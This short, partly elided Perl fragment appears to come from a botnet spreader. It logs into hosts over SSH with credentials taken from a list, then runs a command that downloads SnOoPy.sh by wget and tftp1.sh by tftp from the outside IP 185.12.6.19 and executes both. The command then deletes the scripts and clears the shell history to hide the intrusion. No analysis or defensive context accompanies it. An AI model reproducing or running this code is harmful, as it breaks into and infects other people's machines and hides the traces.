...
scalar(@newarray); $i+=3) {
        ...
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.6.19/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 185.12.6.19 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c');
                        sleep 10;
                        $channel->close;
